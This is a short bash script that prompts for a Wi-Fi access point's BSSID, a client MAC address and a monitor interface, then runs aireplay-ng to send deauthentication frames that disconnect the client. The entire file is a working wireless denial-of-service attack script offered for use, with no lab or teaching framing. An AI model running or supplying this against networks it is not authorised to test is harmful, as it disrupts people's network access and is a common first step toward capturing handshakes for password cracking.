echo "Enter BSSID: "
read bssid

echo "Enter client mac: "
read client

echo "Enter monitor name: "
read monitor

sleep 2
sudo aireplay-ng -deauth 10 -a $bssid -c $client $monitor

